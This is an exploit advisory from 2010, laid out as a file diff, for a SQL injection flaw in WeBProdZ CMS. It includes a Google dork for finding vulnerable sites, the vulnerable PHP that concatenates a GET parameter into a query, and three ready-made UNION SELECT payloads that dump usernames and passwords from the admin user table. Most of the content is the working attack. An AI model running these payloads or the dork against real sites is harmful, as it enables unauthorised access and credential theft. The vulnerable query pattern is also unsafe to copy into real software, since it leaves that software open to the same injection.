@@ -1,0 +1,43 @@
+      ______                _       _   _             
+      | ___ \              | |     | | (_)            
+      | |_/ /_____   _____ | |_   _| |_ _  ___  _ __  
+      |    // _ \ \ / / _ \| | | | | __| |/ _ \| '_ \   
+      | |\ \  __/\ V / (_) | | |_| | |_| | (_) | | | |   
+      \_| \_\___| \_/ \___/|_|\__,_|\__|_|\___/|_| |_| 
+
+        _____                      _____  _____ 
+       |_   _|                    |  _  ||  _  |
+         | | ___  __ _ _ __ ___   | |/' || |_| |
+         | |/ _ \/ _` | '_ ` _ \  |  /| |\____ |
+         | |  __/ (_| | | | | | | \ |_/ /.___/ /
+         \_/\___|\__,_|_| |_| |_|  \___/ \____/
+
+_____________________________________________________________
+   
+[$] Exploit Title     : WeBProdZ CMS SQL Injection Vulnerability
+[$] Date              : 06-05-2010            
+[$] Author            : MasterGipy
+[$] Email             : mastergipy [at] gmail.com
+[$] Bug               : SQL Injection Vulnerability
+[$] Google Dork       : "Desenvolvido por WeBProdZ"
+
+[$] Vulnerable code in /backoffice/textos/editar.php
+
+<?php 
+    include_once("../../ligacao/connDB.php");
+    $sql = "select * from textos where idtextos=".$_GET["id"];
+        
+    $j2 = mysql_query($sql);
+    $o=mysql_fetch_object($j2);
+?>
+
+[$] Exploit
+
+[+] http://[site]/backoffice/textos/editar.php?id=1  <- SQL
+
+[+] sql_1: -1 UNION ALL SELECT 1,2,3--
+[+] sql_2: -1 UNION ALL SELECT 1,2,concat(username,char(58),password)+from+utilizadores--
+[+] sql_3: -1 UNION ALL SELECT 1,2,concat(username,char(58),password_ori)+from+utilizadores--
+
+
+[$] Greetings from PORTUGAL ^^
